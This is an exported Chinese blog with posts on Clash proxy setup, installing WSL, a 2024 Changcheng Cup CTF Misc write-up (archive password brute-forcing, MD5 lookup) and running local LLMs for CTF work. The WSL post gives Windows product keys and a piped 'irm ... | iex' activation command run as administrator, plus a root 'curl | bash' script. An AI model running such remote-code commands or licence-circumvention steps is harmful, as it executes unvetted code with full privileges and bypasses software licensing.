<p>此处可使用现有机场或进行新购买，在此推广星云：<a class="link"   href="https://www.xxxlssop.one/#/register?code=iGLGFrhC%EF%BC%8C%E6%9C%80%E4%BD%8E5%E5%85%83/%E6%9C%88%E3%80%82%E6%8E%A5%E4%B8%8B%E6%9D%A5%E6%AD%A5%E9%AA%A4%E5%B0%86%E4%BB%A5Clash" >https://www.xxxlssop.one/#/register?code=iGLGFrhC，最低5元/月。接下来步骤将以Clash<i class="fas fa-external-link-alt"></i></a> For Windows + 星云为例</p>
<h3 id="配置">配置</h3>
<ul>
<li>购买订阅后，在星云仪表盘中选择一键订阅，在展开框中选择复制订阅地址。</li>
</ul>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113702905.png"
                        alt="image-20250410113702905"
                 ></p>
<ul>
<li>下载并安装完成Clash Verge后，选择左侧第三个订阅，复制订阅地址后选择导入，点击出现的星云方框后左侧会显示蓝色，此时代表选中。</li>
</ul>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113841223.png"
                        alt="image-20250410113841223"
                 ></p>
<ul>
<li>在左侧第二个代理中选择可连通且延迟较低的节点并选中。顶部可选择：全局代理，所有流量都会经过代理进行访问，规则代理，访问部分网站时会根据已有规则不经代理访问，直连为直接连接，所有流量不走代理。</li>
</ul>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113947586.png"
                        alt="image-20250410113947586"
                 ></p>
<ul>
<li>General界面中，System Proxy为系统代理开关，开启后状态栏内小猫会变成黄色，其他选项如图配置即可，注意Clash默认端口为7890，和宽带连接上网相同，且由于Clash问题，若宽带连接名称为中文也会失效，故需要使用PPPoE的用户建议修改Clash端口，并将宽带连接名称改为英文，如PPPoE。</li>
</ul>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307223716267.png"
                        alt="image-20240307223716267"
                 ></p>
<ul>
<li>Clash Verge同理，但是Clash Verge默认端口为7897，所以不会存在上述问题</li>
</ul>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410114107049.png"
                        alt="image-20250410114107049"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307223843654.png"
                        alt="image-20240307223843654"
                 ></p>
<ul>
<li>配置完成后可访问<a class="link"   href="https://www.google.com/" >Google<i class="fas fa-external-link-alt"></i></a>进行连通性测试，如果成功连通则会正常显示。</li>
</ul>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307224342765.png"
                        alt="image-20240307224342765"
                 ></p>
<p>TUN模式：虚拟网卡模式，本机所有流量（包括浏览器、APP、终端、虚拟机等）都会经过一张“虚拟网卡”再进行代理，可以简单理解为“真·全局模式”，但是部分古久版本开启TUN后会使得网络图标变成小地球，新版本会显示为以太网，这些都是正常选项</p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
  </entry>
  <entry>
    <title>WSL安装和使用</title>
    <url>//post/WSL/</url>
    <content><![CDATA[<h3 id="启用Windows功能">启用Windows功能</h3>
<p>按Windows键全局搜索“启用或关闭Windows功能”</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016221806427.png"
                        alt="image-20241016221806427"
                 ></p>
<p>打开后开启图中的四个选项，有些系统可能会没有翻译成中文，记得仔细对照<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016222114609.png"
                        alt="image-20241016222114609"
                 ></p>
<p>然后根据要求重新启动Windows系统</p>
<blockquote>
<p>Windows家庭版默认没有Hyper-V功能，需要自行安装Hyper-V或者改成专业版并重新激活，如果你的电脑环境已经出现了各种难以拯救 / 无法解决 / 工作量太大 / 搜索引擎未收录的报错，更推荐移步至本博客内另一篇文章进行系统重装：<a href="https://c3ngh.top/post/SystemReinstall/">如何优雅的重装系统</a></p>
</blockquote>
<h4 id="Hyper-V安装脚本">Hyper-V安装脚本</h4>
<p>新建一个HyperV-Install.cmd文件，将以下内容复制进去，右键使用管理员身份运行，安装完成后重启计算机即可</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pushd</span> <span class="string">&quot;%~dp0&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /b %SystemRoot%\servicing\Packages\*Hyper<span class="literal">-V</span>*.mum &gt;hyper<span class="literal">-v</span>.txt</span><br><span class="line"><span class="keyword">for</span> /f %%i <span class="keyword">in</span> (<span class="string">&#x27;findstr /i . hyper-v.txt 2^&gt;nul&#x27;</span>) <span class="keyword">do</span> dism /online /norestart /<span class="built_in">add-package</span>:<span class="string">&quot;%SystemRoot%\servicing\Packages\%%i&quot;</span></span><br><span class="line"><span class="built_in">del</span> hyper<span class="literal">-v</span>.txt</span><br><span class="line">Dism /online /<span class="built_in">enable-feature</span> /featurename:Microsoft<span class="literal">-Hyper-V-All</span> /LimitAccess /ALL</span><br></pre></td></tr></table></figure>
<h4 id="修改为专业版（推荐）">修改为专业版（推荐）</h4>
<p>在设置 - 系统 - 激活页面选择更改产品密钥，将密钥修改为以下的一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">J8WVF-9X3GM-4WVYC-VDHQG-42CXT #专业版</span><br><span class="line">DXG7C-N36C4-C4HTG-X4T3X-2YV77 #专业工作站版</span><br></pre></td></tr></table></figure>
<p>随后使用Github的开源激活工具：<a class="link"   href="https://github.com/massgravel/Microsoft-Activation-Scripts" >Microsoft-Activation-Scripts - Github<i class="fas fa-external-link-alt"></i></a> 进行激活</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">irm</span> https://get.activated.win | <span class="built_in">iex</span></span><br></pre></td></tr></table></figure>
<p>以管理员身份在Powershell内运行以上命令按步骤激活即可</p>
<h3 id="安装WSL">安装WSL</h3>
<p>在Windows下按 Win 键，点击Windows PowerShell（管理员），在终端输入：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--install</span> <span class="literal">--no-distribution</span></span><br></pre></td></tr></table></figure>
<p>完成上述命令后，系统会自动安装不带任何发行版的Linux虚拟机</p>
<p>如果想查看已安装的发行版以及相应的WSL版本，可以输入：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--list</span> <span class="literal">--verbose</span></span><br></pre></td></tr></table></figure>
<p>安装Ubuntu</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--install</span> Ubuntu<span class="literal">-22</span>.<span class="number">04</span></span><br></pre></td></tr></table></figure>
<h4 id="也可以选择微软商店安装">也可以选择微软商店安装</h4>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016222658902.png"
                        alt="image-20241016222658902"
                 ></p>
<p>然后就可以快乐的输入用户名和密码使用WSL了，<strong>注意用户名不可以有大写字母</strong></p>
<h3 id="换源">换源</h3>
<p>切换到root用户 <strong>(必须)</strong> ，用以下脚本一把梭</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line">bash &lt;(curl -sSL https://linuxmirrors.cn/main.sh)</span><br></pre></td></tr></table></figure>
<h3 id="报错解决">报错解决</h3>
<h4 id="一、内核更新">一、内核更新</h4>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">WslRegisterDistribution failed with error: 0x800701bc</span><br></pre></td></tr></table></figure>
<p>以上报错需要下载安装适用于 x64 计算机的最新 WSL2 Linux 内核更新包</p>
<p>安装链接：<a class="link"   href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi" >https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="二、回退到无网络">二、回退到无网络</h4>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Users\67300\.wslconfig</span><br><span class="line">Error code: Wsl/Service/CreateInstance/CreateVm/ConfigureNetworking/HNS/E_ACCESSDENIED</span><br><span class="line"></span><br><span class="line">Error message is in norwegian but transelate to &quot;can not configure network (networkingMode Nat) you can disable networking in .wslconfig&quot;</span><br></pre></td></tr></table></figure>
<p>在C盘用户目录下创建一个<code>.wslconfig</code>文件，输入以下内容</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">networkingMode=mirrored</span><br></pre></td></tr></table></figure>
<p>然后Powershell输入即可</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--shutdown</span></span><br></pre></td></tr></table></figure>
<h4 id="三、Sage虚拟环境冲突">三、Sage虚拟环境冲突</h4>
<p>Windows版SageMath会自带一个<code>VirtualBox</code>的类Unix虚拟环境，会导致Hyper-V停止运行</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018121907889.png"
                        alt="image-20241018121907889"
                 ></p>
<p>首先需要使用<code>Geek Uninstaller</code>彻底删除SageMath</p>
<p>需要重新关开<code>Hyper-V</code>和<code>虚拟机平台</code>，如果任务管理器里的虚拟化也被关闭了，则需要进入BIOS重新开启</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/7c359130a6cdeac464bf69a211600f7a.png"
                        alt="7c359130a6cdeac464bf69a211600f7a"
                 ></p>
<h4 id="四、安卓模拟器冲突">四、安卓模拟器冲突</h4>
<p>部分安卓模拟器的虚拟化技术会和<code>Hyper-V</code>冲突，需使用<code>Geek Uninstaller</code>删除后重新在<code>启用Windows功能</code>中开启<code>Hyper-V</code>和<code>虚拟机平台</code>等选项，如果有模拟器需求，可以换用<code>WSA（Windows Subsystem for Android）</code>或支持与<code>Hyper-V</code>兼容的模拟器，目前测试可用：网易MuMu模拟器，逍遥安卓等</p>
<h4 id="五、运行32位i386程序报错">五、运行32位i386程序报错</h4>
<p>如果遇到<code>./可执行文件</code>显示<code>No Such File or Directory</code>，在排除路径和文件自身问题后，可能是windows支持的Linux的系统对32位程序运行的不能直接支持的问题导致的，需要安装相对应的运行库。</p>
<p>按步骤完成以下命令即可：</p>
<p>安装<code>qemu-user-static</code>，用来模拟运行32位的i386可执行程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu-user-static</span><br></pre></td></tr></table></figure>
<p>在系统的<code>binfmt support</code>的服务中增加i386可执行程序文件格式的支持并添加自动启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-binfmts --install i386 /usr/bin/qemu-i386-static --magic <span class="string">&#x27;\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00&#x27;</span> --mask <span class="string">&#x27;\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff&#x27;</span></span><br><span class="line"><span class="built_in">sudo</span> service binfmt-support start</span><br></pre></td></tr></table></figure>
<p>增加i386支持并安装i386程序运行需要依赖的软件包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dpkg --add-architecture i386</span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install -y libc6:i386 libncurses5:i386 libstdc++6:i386 zlib1g:i386 zlib1g-dev:i386</span><br></pre></td></tr></table></figure>
<h3 id="开启嵌套虚拟化">开启嵌套虚拟化</h3>
<p><a class="link"   href="https://learn.microsoft.com/zh-cn/virtualization/hyper-v-on-windows/user-guide/enable-nested-virtualization" >借助嵌套虚拟化在虚拟机中运行 Hyper-V | Microsoft Learn<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="文件资源管理器中的Linux消失">文件资源管理器中的Linux消失</h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250116152411627.png"
                        alt="image-20250116152411627"
                 ></p>
<p>如果该图标消失，可以在文件资源管理器顶部输入<code>\\wsl$</code>进行图形化文件交互，如果想让该图标重新出现，则可以在<a class="link"   href="https://github.com/microsoft/WSL/releases/" >Releases · microsoft/WSL<i class="fas fa-external-link-alt"></i></a>中重新下载WSL，安装后重启文件资源管理器进程即可</p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
  </entry>
  <entry>
    <title>2024长城杯 Misc方向部分WP</title>
    <url>//post/ccb2024wp/</url>
    <content><![CDATA[<p>记录一下第一次独立在大型比赛中AK Misc~</p>
<h3 id="BrickGame">BrickGame</h3>
<p>玩游戏签到</p>
<h3 id="漏洞探踪，流量解密">漏洞探踪，流量解密</h3>
<p>第一阶段找一个IP地址，<a class="link"   href="http://xn--ip192-oy2iwdu81bzyyow5b.168.30.xxx" >确定ip地址是192.168.30.xxx<i class="fas fa-external-link-alt"></i></a>，实在太多了找不到，写个脚本开爆</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件名</span></span><br><span class="line">output_file = <span class="string">&#x27;ip_addresses.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件进行写入</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="comment"># 循环生成 IP 地址</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        ip_address = <span class="string">f&#x27;192.168.30.<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        file.write(ip_address + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;IP 地址列表已生成并保存到 <span class="subst">&#123;output_file&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>生成字典后爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件路径</span></span><br><span class="line">archive_path = <span class="string">&#x27;C:/Users/67300/Desktop/1/1.7z&#x27;</span></span><br><span class="line"><span class="comment"># 字典文件路径</span></span><br><span class="line">dictionary_path = <span class="string">&#x27;C:/Users/67300/Desktop/1/ip_addresses.txt&#x27;</span></span><br><span class="line"><span class="comment"># 线程数</span></span><br><span class="line">max_threads = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_with_password</span>(<span class="params">archive_path, password</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> py7zr.SevenZipFile(archive_path, mode=<span class="string">&#x27;r&#x27;</span>, password=password) <span class="keyword">as</span> archive:</span><br><span class="line">            archive.extractall(path=<span class="string">&#x27;./extracted&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Password found: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> py7zr.exceptions.Bad7zFile:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Bad 7z file&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> py7zr.exceptions.PasswordRequired:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attempt_password</span>(<span class="params">password</span>):</span><br><span class="line">    password = password.strip()</span><br><span class="line">    <span class="keyword">if</span> extract_with_password(archive_path, password):</span><br><span class="line">        <span class="keyword">return</span> password</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_password</span>(<span class="params">dictionary_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dictionary_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        passwords = file.readlines()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) <span class="keyword">as</span> executor:</span><br><span class="line">        futures = &#123;executor.submit(attempt_password, password): password <span class="keyword">for</span> password <span class="keyword">in</span> passwords&#125;</span><br><span class="line">        <span class="keyword">for</span> future <span class="keyword">in</span> concurrent.futures.as_completed(futures):</span><br><span class="line">            result = future.result()</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Success: The password is <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">                executor.shutdown(wait=<span class="literal">False</span>)</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Password not found&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行爆破</span></span><br><span class="line">brute_force_password(dictionary_path)</span><br></pre></td></tr></table></figure>
<p>获得密钥：192.168.30.254</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ccb01.png"
                        alt="ccb01"
                 ></p>
<p>进入第二阶段</p>
<p>在流92中获得密钥</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ccb02.png"
                        alt="ccb02"
                 ></p>
<p>在95流中获得加密方式RC4</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ccb03.png"
                        alt="ccb03"
                 ></p>
<p>在95流中获得加密方式RC4</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ccb04.png"
                        alt="ccb04"
                 ></p>
<p>解密rc4后hex即可</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ccb05.png"
                        alt="ccb05"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ccb06.png"
                        alt="ccb06"
                 ></p>
<h3 id="最安全的加密方式">最安全的加密方式</h3>
<p>流13内找到一个<code>$pass='25ming@'</code>，目测是哥斯拉流量但是没啥用</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ccb07.png"
                        alt="ccb07"
                 ></p>
<p>流15找到一个RAR压缩包，另存为下来CyberChef手提一个压缩包，用之前的pass为解压密码成功解压，获得一个flag.txt</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ccb08.png"
                        alt="ccb08"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ccb09.png"
                        alt="ccb09"
                 ></p>
<p>看到这样的形式很像32位md5，联想到UNCTF 2022的那道题，写出hash爆破脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;&#x27;8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">2db95e8e1a9267b7a1188556b2013b33</span></span><br><span class="line"><span class="string">0cc175b9c0f1b6a831c399e269772661</span></span><br><span class="line"><span class="string">b2f5ff47436671b6e533d8dc3614845d</span></span><br><span class="line"><span class="string">f95b70fdc3088560732a5ac135644506</span></span><br><span class="line"><span class="string">b9ece18c950afbfa6b0fdbfa4ff731d3</span></span><br><span class="line"><span class="string">2510c39011c5be704182423e3a695e91</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">b14a7b8059d9c055954c92674ce60032</span></span><br><span class="line"><span class="string">6f8f57715090da2632453988d9a1501b</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">03c7c0ace395d80182db07ae2c30f034</span></span><br><span class="line"><span class="string">e358efa489f58062f10dd7316b65649e</span></span><br><span class="line"><span class="string">b14a7b8059d9c055954c92674ce60032</span></span><br><span class="line"><span class="string">c81e728d9d4c2f636f067f89cc14862c</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">4a8a08f09d37b73795649038408b5f33</span></span><br><span class="line"><span class="string">4c614360da93c0a041b22e537de151eb</span></span><br><span class="line"><span class="string">4b43b0aee35624cd95b910189b3dc231</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">b14a7b8059d9c055954c92674ce60032</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">8d9c307cb7f3c4a32822a51922d1ceaa</span></span><br><span class="line"><span class="string">4a8a08f09d37b73795649038408b5f33</span></span><br><span class="line"><span class="string">4b43b0aee35624cd95b910189b3dc231</span></span><br><span class="line"><span class="string">57cec4137b614c87cb4e24a3d003a3e0</span></span><br><span class="line"><span class="string">83878c91171338902e0fe0fb97a8c47a</span></span><br><span class="line"><span class="string">e358efa489f58062f10dd7316b65649e</span></span><br><span class="line"><span class="string">865c0c0b4ab0e063e5caa3387c1a8741</span></span><br><span class="line"><span class="string">d95679752134a2d9eb61dbd7b91c4bcc</span></span><br><span class="line"><span class="string">7b8b965ad4bca0e41ab51de7b31363a1</span></span><br><span class="line"><span class="string">9033e0e305f247c0c3c80d0c7848c8b3</span></span><br><span class="line"><span class="string">9033e0e305f247c0c3c80d0c7848c8b3</span></span><br><span class="line"><span class="string">9033e0e305f247c0c3c80d0c7848c8b3</span></span><br><span class="line"><span class="string">cbb184dd8e05c9709e5dcaedaa0495cf&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>))</span><br><span class="line">t = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    t[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()] = <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    flag += t[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"> </span><br><span class="line"> <span class="comment">#flag&#123;The_m0st_2ecUre_eNcrYption!!!&#125;</span></span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ccb10.png"
                        alt="ccb10"
                 ></p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>Ollama+AnythingLLM实现本地CTF大模型</title>
    <url>//post/ollama/</url>
    <content><![CDATA[<blockquote>
<p>[!CAUTION]</p>
<p>RAM小于16GB或只有老旧核显的电脑不推荐尝试</p>
</blockquote>
<p>测试环境：</p>
<ul>
<li>
<p>R9-7945HX</p>
</li>
<li>
<p>RTX4060 Laptop 8G</p>
</li>
<li>
<p>32G DDR5 5200MHz</p>
</li>
</ul>
<p>模型推荐：</p>
<ul>
<li><a class="link"   href="https://ollama.com/library/llama3.1" >llama3.1 - 8b<i class="fas fa-external-link-alt"></i></a>：16GB RAM可用，可自定义prompt，较为全面</li>
<li><a class="link"   href="https://ollama.com/library/deepseek-coder-v2" >deepseek-coder-v2 - 16b<i class="fas fa-external-link-alt"></i></a>：32GB RAM可用，代码能力较强，可自定义prompt，安全限制较少</li>
<li><a class="link"   href="https://ollama.com/library/deepseek-r1" >deepseek-r1 - 14b<i class="fas fa-external-link-alt"></i></a>：推理很强，但是生成答案速度比较慢，不太适合用于比赛，但很聪明</li>
</ul>
<h3 id="安装Ollama">安装Ollama</h3>
<p>在该链接中下载<a class="link"   href="https://ollama.com/download" >Download Ollama<i class="fas fa-external-link-alt"></i></a>对应系统版本的Ollama，并将其安装在任意位置，Windows也可以在WSL2中进行安装。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250126144708535.png"
                        alt="image-20250126144708535"
                 ></p>
<p>安装完成后双击快捷方式运行Ollama，然后在官网上查询想要部署的开源大模型 <a class="link"   href="https://ollama.com/search" >Models - Ollama<i class="fas fa-external-link-alt"></i></a>，在Powershell中运行官网给出的命令即可进行安装并运行。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250126144914598.png"
                        alt="image-20250126144914598"
                 ></p>
<h4 id="安装到其他盘">安装到其他盘</h4>
<p>Ollama会默认安装到<code>C:\Users%username%\AppData\Local\Programs\Ollama</code>目录下，所有下载的模型都会安装到<code>C:\Users%username%.ollama\models</code>目录下，如有需求可以默认将下载的模型保存到其他盘。具体配置方法如下：</p>
<p>打开「系统环境变量」，新建一个系统变量OLLAMA_MODELS ，然后设置Ollama模型的存储路径。</p>
<p>变量名：OLLAMA_MODELS</p>
<p>变量值（路径）：D:\ZJNU\OLLAMA（修改为你需要的路径）</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250126151645233.png"
                        alt="image-20250126151645233"
                 ></p>
<p>然后再执行<code>ollama run</code>或<code>ollama pull</code>，模型将会默认安装到你设置的路径下</p>
<h3 id="运行Ollama">运行Ollama</h3>
<p>现版本Ollama会默认添加环境变量，只需在命令行窗口中输入<code>ollama run 模型名称</code>即可使用大模型。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250126152218867.png"
                        alt="image-20250126152218867"
                 ></p>
<h3 id="安装AnythingLLM">安装AnythingLLM</h3>
<p>该程序可为Ollama提供图形化界面，下载地址：<a class="link"   href="https://anythingllm.com/" >AnythingLLM | The all-in-one AI application for everyone<i class="fas fa-external-link-alt"></i></a>，安装完成后进行如下配置：Provider选择Ollama，Model选择之前安装的，其余配置保持默认即可，如果修改过端口则需要修改对应端口。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250126153229712.png"
                        alt="image-20250126153229712"
                 ></p>
<p>该配置日后也可以在设置中修改</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250126153554445.png"
                        alt="image-20250126153554445"
                 ></p>
<h3 id="自定义Prompt和知识库">自定义Prompt和知识库</h3>
<p>在AnythingLLM中设置工作区和Thread后可以设置自定义Prompt和自定义知识库</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250126153925169.png"
                        alt="image-20250126153925169"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250126154204838.png"
                        alt="image-20250126154204838"
                 ></p>
<p>该过程花费时间可能较长，老版本AnythingLLM可能会出现假死机情况，可以少量多次进行移动，新版本有所改善。</p>
<p>完成后在AnythingLLM中提问大模型即可引用自定义上传的资料。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250126154350676.png"
                        alt="image-20250126154350676"
                 ></p>
<h3 id="配置端口（可选）">配置端口（可选）</h3>
<p>Ollama API 的默认访问地址和侦听端口是<a class="link"   href="http://localhost:11434" >http://localhost:11434<i class="fas fa-external-link-alt"></i></a>，只能在装有 Ollama 的系统中直接调用。如果要在网络中提供服务，需在环境变量中修改 API 的侦听地址和端口为：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">变量名：OLLAMA_HOST</span><br><span class="line">变量值（端口）：:8000（注意前面有一个冒号）</span><br></pre></td></tr></table></figure>
